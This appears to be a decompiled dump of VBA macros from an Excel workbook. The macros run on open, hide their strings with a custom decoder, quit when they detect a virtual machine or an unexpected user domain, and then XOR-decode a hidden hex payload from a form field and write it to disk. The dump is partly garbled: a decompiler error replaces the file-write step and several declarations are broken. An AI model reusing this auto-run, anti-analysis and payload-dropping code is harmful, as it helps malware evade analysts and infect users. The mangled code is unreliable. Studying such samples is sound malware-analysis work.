None
stream : _VBA_PROJECT_CUR/VBA/ThisWorkbook - 1785 bytes
########################################

Sub Workbook_Open()
  Sheet1.folderol
End Sub

Sub Auto_Open()
  Sheet1.folderol
End Sub
stream : _VBA_PROJECT_CUR/VBA/F - 1388 bytes
########################################


stream : _VBA_PROJECT_CUR/VBA/Sheet1 - 10518 bytes
########################################

Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef dwflags As Long, ByVal dwReserved As Long) As Long
  
  Private Declare PtrSafe Function mciSendString Lib "winmm.dll" (ByVal lpstrCommand As String, ByVal lpstrReturnString As , ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
    
    Private Declare Function GetShortPathName Lib "kernel32" (ByVal lpszLongPath As String, ByVal lpszShortPath As String, ByVal lBuffer As Long) As Long
      
      Public Function GetInternetConnectedState(id_FFFE As Boolean) As Boolean
        GetInternetConnectedState = InternetGetConnectedState(0, 0)
      End Function
      
      Function rigmarole(es As String, id_FFFE As String) As String
        Dim furphy As String
        Dim c As Integer
        Dim s As String
        Dim cc As Integer
        furphy = ""
        For i = 1 To Len(es) Step 4
          c = CDec("&H" & Mid(es, i, 2))
          s = CDec("&H" & Mid(es, i + 2, 2))
          cc = c - s
          furphy = furphy + Chr(cc)
        Next i
        rigmarole = furphy
      End Function
      
      Function folderol(id_FFFE As Variant)
        Dim wabbit As Byte
        Dim fn As Integer: fn = FreeFile
        Dim onzo As String
        Dim mf As String
        Dim xertz As Variant
        Dim buff(0 To 7) As Byte
        
        onzo = Split(F.L, ".")
        
        If GetInternetConnectedState = False Then
          MsgBox "Cannot establish Internet connection.", vbCritical, "Error"
          End
        End If
        
        Set fudgel = GetObject(rigmarole(onzo(7)))
        Set twattling = fudgel.ExecQuery(rigmarole(onzo(8)), , 48)
        For Each p In twattling
          Dim pos As Integer
          pos = Instr(LCase(p.Name), "vmw") + Instr(LCase(p.Name), "vmt") + Instr(LCase(p.Name), rigmarole(onzo(9)))
          If pos > 0 Then
            MsgBox rigmarole(onzo(4)), vbCritical, rigmarole(onzo(6))
            End
          End If
        Next
        
        xertz = Array(&H11, &H22, &H33, &H44, &H55, &H66, &H77, &H88, &H99, &HAA, &HBB, &HCC, &HDD, &HEE)
        
        Set groke = CreateObject(rigmarole(onzo(10)))
        firkin = groke.UserDomain
        If firkin <> rigmarole(onzo(3)) Then
          MsgBox rigmarole(onzo(4)), vbCritical, rigmarole(onzo(6))
          End
        End If
        
        n = Len(firkin)
        For i = 1 To n
          buff(n - i) = Asc(Mid$(firkin, i, 1))
        Next
        
        wabbit = canoodle(F.T.Text, 2, 285729, buff)
        mf = Environ(rigmarole(onzo(0))) & rigmarole(onzo(11))
        Open mf For Binary Lock Read Write As #fn
' a generic exception occured at line 68: cannot concatenate 'str' and 'NoneType' objects
'	# Ld fn
'	# Sharp
'	# LitDefault
'	# Ld wabbit
'	# PutRec
        Close #fn
        
        Set panuding = Sheet1.Shapes.AddPicture(mf, False, True, 12, 22, 600, 310)
      End Function
      
      Function canoodle(panjandrum As String, ardylo As Integer, s As Long, bibble As Variant, id_FFFE As ) As Append
        Dim quean As Long
        Dim cattywampus As Long
        Dim kerfuffle As Byte
        ReDim kerfuffle(s)
        quean = 0
        For cattywampus = 1 To Len(panjandrum) Step 4
          kerfuffle(quean) = CByte("&H" & Mid(panjandrum, cattywampus + ardylo, 2)) Xor bibble(quean Mod (UBound(bibble) + 1))
          quean = quean + 1
          If quean = UBound(kerfuffle) Then
            Exit For
          End If
        Next cattywampus
        canoodle = kerfuffle
      End Function
      

